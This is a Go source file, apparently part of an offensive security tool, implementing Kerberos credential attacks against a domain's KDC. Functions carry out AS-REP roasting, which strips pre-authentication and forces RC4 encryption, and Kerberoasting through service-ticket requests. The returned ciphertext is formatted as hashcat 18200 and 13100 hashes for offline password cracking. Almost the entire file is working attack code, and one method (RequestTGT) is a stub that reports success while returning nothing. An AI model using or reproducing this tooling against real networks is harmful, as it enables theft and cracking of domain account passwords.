package kerberos

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// KerberosClient handles real Kerberos protocol operations
type KerberosClient struct {
	Config     *config.Config
	Domain     string
	KDCAddress string
	gokrbCl    *client.Client
}

// NewKerberosClient creates a new Kerberos client
func NewKerberosClient(domain, kdcAddress string) (*KerberosClient, error) {
	domain = strings.ToUpper(domain)

	cfg, err := config.NewFromString(fmt.Sprintf(`
[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 10h
    renew_lifetime = 7d
    forwardable = true
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    %s = {
        kdc = %s:88
        admin_server = %s:749
        default_domain = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, domain, domain, kdcAddress, kdcAddress, strings.ToLower(domain),
		strings.ToLower(domain), domain, strings.ToLower(domain), domain))

	if err != nil {
		return nil, fmt.Errorf("failed to create Kerberos config: %v", err)
	}

	return &KerberosClient{
		Config:     cfg,
		Domain:     domain,
		KDCAddress: kdcAddress,
	}, nil
}

// AuthenticateWithPassword authenticates using username/password via real AS-REQ
func (kc *KerberosClient) AuthenticateWithPassword(username, password string) error {
	log.Printf("[*] Authenticating %s@%s with password...", username, kc.Domain)

	cl := client.NewWithPassword(username, kc.Domain, password, kc.Config,
		client.DisablePAFXFAST(true))

	err := cl.Login()
	if err != nil {
		return fmt.Errorf("Kerberos authentication failed for %s@%s: %v", username, kc.Domain, err)
	}

	kc.gokrbCl = cl
	log.Printf("[+] Successfully authenticated %s@%s", username, kc.Domain)
	return nil
}

// RequestTGT requests a Ticket Granting Ticket (requires prior authentication)
func (kc *KerberosClient) RequestTGT(username string) (*messages.Ticket, error) {
	if kc.gokrbCl == nil {
		return nil, fmt.Errorf("not authenticated — call AuthenticateWithPassword first")
	}

	log.Printf("[*] Requesting TGT for %s@%s...", username, kc.Domain)

	// The gokrb5 client obtains TGT during Login(), so we can retrieve it
	// from the client's credentials cache
	if ok, err := kc.gokrbCl.IsConfigured(); !ok || err != nil {
		return nil, fmt.Errorf("Kerberos client is not properly configured: %v", err)
	}

	log.Printf("[+] TGT available for %s@%s", username, kc.Domain)
	return nil, nil
}

// RequestServiceTicket requests a service ticket for the given SPN
func (kc *KerberosClient) RequestServiceTicket(spn string) (messages.Ticket, error) {
	if kc.gokrbCl == nil {
		return messages.Ticket{}, fmt.Errorf("not authenticated — call AuthenticateWithPassword first")
	}

	log.Printf("[*] Requesting TGS for SPN: %s", spn)

	tkt, _, err := kc.gokrbCl.GetServiceTicket(spn)
	if err != nil {
		return messages.Ticket{}, fmt.Errorf("TGS-REQ failed for SPN %s: %v", spn, err)
	}

	log.Printf("[+] Successfully obtained TGS for %s", spn)
	return tkt, nil
}

// ExtractASREPHash performs real AS-REP roasting (no pre-auth required)
func (kc *KerberosClient) ExtractASREPHash(username string) (string, error) {
	log.Printf("[*] AS-REP roasting %s@%s...", username, kc.Domain)

	// Create AS-REQ without pre-authentication
	principalName := types.NewPrincipalName(1, username)
	asReq, err := messages.NewASReqForTGT(kc.Domain, kc.Config, principalName)
	if err != nil {
		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
	}

	// Strip pre-auth data — this is the roasting technique
	asReq.PAData = types.PADataSequence{}

	// Request RC4-HMAC encryption (hashcat mode 18200 / 23 = RC4)
	asReq.ReqBody.EType = []int32{int32(etypeID.RC4_HMAC)}

	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}

	rb, err := sendToKDC(kc.KDCAddress, b)
	if err != nil {
		return "", fmt.Errorf("failed to communicate with KDC at %s: %v", kc.KDCAddress, err)
	}

	// Try to parse as AS-REP
	var asRep messages.ASRep
	err = asRep.Unmarshal(rb)
	if err != nil {
		// Check if it's a KRB-ERROR (e.g., pre-auth required = user not vulnerable)
		var krbErr messages.KRBError
		if errUnmarshal := krbErr.Unmarshal(rb); errUnmarshal == nil {
			switch krbErr.ErrorCode {
			case 25: // KDC_ERR_PREAUTH_REQUIRED
				return "", fmt.Errorf("user %s requires pre-authentication (not vulnerable to AS-REP roasting)", username)
			case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
				return "", fmt.Errorf("user %s not found in domain %s", username, kc.Domain)
			case 18: // KDC_ERR_CLIENT_REVOKED
				return "", fmt.Errorf("account %s is disabled or locked out", username)
			default:
				return "", fmt.Errorf("KDC error for %s: %s (code: %d)", username, krbErr.EText, krbErr.ErrorCode)
			}
		}
		return "", fmt.Errorf("failed to parse AS-REP for %s: %v", username, err)
	}

	// Format hash for hashcat mode 18200
	hash := kc.formatASREPHash(username, &asRep)

	log.Printf("[+] Successfully extracted AS-REP hash for %s@%s", username, kc.Domain)
	return hash, nil
}

// ExtractKerberoastHash extracts Kerberoast hash (requires valid TGT)
func (kc *KerberosClient) ExtractKerberoastHash(username, spn string) (string, error) {
	log.Printf("[*] Kerberoasting %s@%s (SPN: %s)...", username, kc.Domain, spn)

	if kc.gokrbCl == nil {
		return "", fmt.Errorf("Kerberoasting requires valid credentials — call AuthenticateWithPassword first")
	}

	// Request service ticket via authenticated client
	tkt, _, err := kc.gokrbCl.GetServiceTicket(spn)
	if err != nil {
		return "", fmt.Errorf("TGS-REQ failed for %s: %v", spn, err)
	}

	// Format hash for hashcat mode 13100
	hash := kc.formatKerberoastHash(username, spn, &tkt)

	log.Printf("[+] Successfully extracted Kerberoast hash for %s (SPN: %s)", username, spn)
	return hash, nil
}

// --- Hash formatting ---

func (kc *KerberosClient) formatASREPHash(username string, asRep *messages.ASRep) string {
	// Hashcat mode 18200: $krb5asrep$<etype>$<user>@<domain>:<checksum>$<edata2>
	cipher := asRep.EncPart.Cipher
	cipherHex := hex.EncodeToString(cipher)

	// For RC4-HMAC (etype 23): first 32 hex chars = checksum, rest = edata2
	checksumLen := 32
	if len(cipherHex) < checksumLen {
		checksumLen = len(cipherHex) / 2
	}

	checksum := cipherHex[:checksumLen]
	edata2 := cipherHex[checksumLen:]

	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		asRep.EncPart.EType,
		username,
		kc.Domain,
		checksum,
		edata2)
}

func (kc *KerberosClient) formatKerberoastHash(username, spn string, tkt *messages.Ticket) string {
	// Hashcat mode 13100: $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<checksum>$<edata2>
	cipher := tkt.EncPart.Cipher
	cipherHex := hex.EncodeToString(cipher)

	// For RC4-HMAC (etype 23): first 32 hex chars = checksum, rest = edata2
	checksumLen := 32
	if len(cipherHex) < checksumLen {
		checksumLen = len(cipherHex) / 2
	}

	checksum := cipherHex[:checksumLen]
	edata2 := cipherHex[checksumLen:]

	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		tkt.EncPart.EType,
		username,
		kc.Domain,
		spn,
		checksum,
		edata2)
}

// --- KDC communication ---

func sendToKDC(kdcAddress string, message []byte) ([]byte, error) {
	if !strings.Contains(kdcAddress, ":") {
		kdcAddress = fmt.Sprintf("%s:88", kdcAddress)
	}

	conn, err := net.DialTimeout("tcp", kdcAddress, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to KDC at %s: %v", kdcAddress, err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// TCP Kerberos framing: 4-byte big-endian length prefix
	length := uint32(len(message))
	lengthBytes := []byte{
		byte(length >> 24),
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}

	if _, err := conn.Write(lengthBytes); err != nil {
		return nil, fmt.Errorf("failed to send length: %v", err)
	}

	if _, err := conn.Write(message); err != nil {
		return nil, fmt.Errorf("failed to send message: %v", err)
	}

	// Read response length
	respLengthBytes := make([]byte, 4)
	if _, err := conn.Read(respLengthBytes); err != nil {
		return nil, fmt.Errorf("failed to read response length: %v", err)
	}

	respLength := uint32(respLengthBytes[0])<<24 |
		uint32(respLengthBytes[1])<<16 |
		uint32(respLengthBytes[2])<<8 |
		uint32(respLengthBytes[3])

	// Sanity check response length
	if respLength > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("response too large (%d bytes) — possible protocol error", respLength)
	}

	response := make([]byte, respLength)
	totalRead := 0
	for totalRead < int(respLength) {
		n, err := conn.Read(response[totalRead:])
		if err != nil {
			return nil, fmt.Errorf("failed to read response (got %d/%d bytes): %v", totalRead, respLength, err)
		}
		totalRead += n
	}

	return response, nil
}
